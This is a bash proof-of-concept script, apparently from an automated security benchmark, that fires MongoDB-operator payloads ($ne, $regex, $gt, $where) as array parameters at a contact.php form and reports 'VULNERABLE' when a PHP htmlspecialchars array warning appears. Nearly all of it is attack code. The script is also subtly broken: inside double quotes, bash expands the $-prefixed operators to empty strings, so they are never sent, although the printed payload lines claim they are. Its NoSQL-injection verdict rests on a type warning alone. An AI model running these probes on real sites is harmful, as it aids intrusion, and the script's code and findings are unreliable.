#!/bin/bash
# POC: Demonstrates NoSQL injection vulnerabilities in email and message fields of the contact form by sending array-type parameters using MongoDB operators, causing type confusion warnings in htmlspecialchars()
# Target: ./repo
# Created: 2025-11-07T16:40:16.015Z
# Session: benchmark-XBEN-097-24-mhp2dzly

# NoSQL Injection POC for Contact Form Email and Message Fields
# This script demonstrates that array-type parameters can be injected
# into email and message fields, causing type confusion and potential NoSQL injection

TARGET_URL="${1:-http://localhost}"
CONTACT_FORM="${TARGET_URL}/contact.php"

echo "=========================================="
echo "NoSQL Injection POC - Email & Message Fields"
echo "=========================================="
echo "Target: $CONTACT_FORM"
echo ""

# Test 1: Email field with $ne operator
echo "[*] Test 1: Email field with \$ne operator"
echo "Payload: email[\$ne]=&name=test&message=test"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONTACT_FORM" \
  --data "email[$ne]=&name=test&message=test")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "htmlspecialchars.*array"; then
  echo "✓ VULNERABLE: htmlspecialchars error detected (array passed without validation)"
  echo "Evidence: $(echo "$BODY" | grep -o "htmlspecialchars.*array" | head -1)"
else
  echo "Response contains: $(echo "$BODY" | head -c 200)..."
fi
echo ""

# Test 2: Message field with $ne operator
echo "[*] Test 2: Message field with \$ne operator"
echo "Payload: message[\$ne]=&name=test&email=test@test.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONTACT_FORM" \
  --data "message[$ne]=&name=test&email=test@test.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "htmlspecialchars.*array"; then
  echo "✓ VULNERABLE: htmlspecialchars error detected (array passed without validation)"
  echo "Evidence: $(echo "$BODY" | grep -o "htmlspecialchars.*array" | head -1)"
else
  echo "Response contains: $(echo "$BODY" | head -c 200)..."
fi
echo ""

# Test 3: Message field with $regex operator
echo "[*] Test 3: Message field with \$regex operator"
echo "Payload: message[\$regex]=.*&name=test&email=test@test.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONTACT_FORM" \
  --data "message[$regex]=.*&name=test&email=test@test.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "htmlspecialchars.*array"; then
  echo "✓ VULNERABLE: htmlspecialchars error detected (array passed without validation)"
  echo "Evidence: $(echo "$BODY" | grep -o "htmlspecialchars.*array" | head -1)"
else
  echo "Response contains: $(echo "$BODY" | head -c 200)..."
fi
echo ""

# Test 4: Email field with $gt operator
echo "[*] Test 4: Email field with \$gt operator"
echo "Payload: email[\$gt]=&name=test&message=test"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONTACT_FORM" \
  --data "email[$gt]=&name=test&message=test")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "htmlspecialchars.*array"; then
  echo "✓ VULNERABLE: htmlspecialchars error detected (array passed without validation)"
  echo "Evidence: $(echo "$BODY" | grep -o "htmlspecialchars.*array" | head -1)"
else
  echo "Response contains: $(echo "$BODY" | head -c 200)..."
fi
echo ""

# Test 5: Message field with $where operator
echo "[*] Test 5: Message field with \$where operator"
echo "Payload: message[\$where]=return true&name=test&email=test@test.com"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$CONTACT_FORM" \
  --data "message[$where]=return true&name=test&email=test@test.com")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "htmlspecialchars.*array"; then
  echo "✓ VULNERABLE: htmlspecialchars error detected (array passed without validation)"
  echo "Evidence: $(echo "$BODY" | grep -o "htmlspecialchars.*array" | head -1)"
else
  echo "Response contains: $(echo "$BODY" | head -c 200)..."
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "=========================================="